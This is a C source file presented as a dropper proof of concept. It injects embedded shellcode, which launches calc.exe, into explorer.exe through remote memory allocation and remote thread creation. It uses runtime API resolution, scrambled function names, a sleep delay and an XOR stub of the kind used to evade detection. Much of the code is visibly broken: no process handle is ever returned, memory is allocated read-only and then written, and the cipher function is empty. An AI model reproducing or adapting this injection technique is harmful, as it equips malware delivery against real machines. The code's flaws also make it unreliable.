/*
    Author:    lemur
    GitHub:    https://github.com/1emvr
    Email:     1emvr@protonmail.com
    Date:      01/08/2023   11:46 AM

    Dropper proof of concept (calc.exe)
    Definitions/Prototypes: https://learn.microsoft.com/en-us/windows/win32/api
*/
#include <Windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <synchapi.h>
#include <stdio.h>
#include <stdlib.h>

unsigned char _LTABLI[] = {
    0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,
    0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,
    0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,
    0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,
    0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x6a,0x01,0x8d,
    0x85,0xb2,0x00,0x00,0x00,0x50,0x68,0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x06,0x7c,
    0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00
};

typedef LPVOID(WINAPI* VirtualAllocEx_t)(
   
    HANDLE hProcess,
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD flAllocationType,
    DWORD flProtect
);
typedef BOOL(WINAPI* WriteProcessMemory_t)(
    
    HANDLE hProcess,
    LPVOID lpBaseAddress,
    LPCVOID lpBuffer,
    SIZE_T nSize,
    SIZE_T *lpNumberOfBytesWritten
);
typedef HANDLE(WINAPI* CreateRemoteThread_t) (
    
    HANDLE hProcess,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    SIZE_T dwStackSize,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID lpParameter,
    DWORD dwCreationFlags,
    LPDWORD lpThreadId
);

HANDLE KdciYl_jhy__bnh__(const char* processName) {

    int pid = 0;

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

    PROCESSENTRY32 processListEntry;
    processListEntry.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnapshot, &processListEntry)) {
        CloseHandle(hSnapshot);
        return 0;
    }
    while (Process32Next(hSnapshot, &processListEntry)) {
        if (lstrcmpiA(processName, (LPCSTR)processListEntry.szExeFile) == 0) {
            pid = processListEntry.th32ProcessID;
            break;
        }
    }
}

int Dcghny_ltabli(HANDLE hProcess, unsigned char *_LTABLI, unsigned int TableSize) {

    LPVOID pRemoteShellcode = NULL;
    HANDLE hThread = NULL;

    VirtualAllocEx_t pVirtualAllocEx = (VirtualAllocEx_t)GetProcAddress(GetModuleHandle((LPCWSTR)"kernel32.dll"), "VirtualAllocEx");
    pRemoteShellcode = pVirtualAllocEx(hProcess, NULL, TableSize, MEM_COMMIT, PAGE_EXECUTE_READ);
    
    Sleep(10000);
    XORCipher();

    WriteProcessMemory_t pWriteProcessMemory = (WriteProcessMemory_t)GetProcAddress(GetModuleHandle((LPCWSTR)"kernel32.dll"), "WriteProcessMemory");
    pWriteProcessMemory(hProcess, pRemoteShellcode, _LTABLI, TableSize, NULL);
    XORCipher();

    CreateRemoteThread_t pCreateRemoteThread = (CreateRemoteThread_t)GetProcAddress(GetModuleHandle((LPCWSTR)"kernel32.dll"), "CreateRemoteThread");

    unsigned char XORCipher();
    hThread = pCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteShellcode, NULL, 0, NULL);
    unsigned char XORCipher();

    if (hThread != NULL) {
        WaitForSingleObject(hThread, 500);
        CloseHandle(hThread);
        return 0;
    }
    return -1;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR LpCmdLine, int nCmdShow) {

    HANDLE hProcess = NULL;
    unsigned int TableSize = sizeof(_LTABLI);

    hProcess = KdciYl_jhy__bnh__("explorer.exe");

    if (hProcess != NULL) {
        Dcghny_ltabli(hProcess, _LTABLI, TableSize);
        CloseHandle(hProcess);
    }
    return 0;
}

unsigned char XORCipher() {

    
}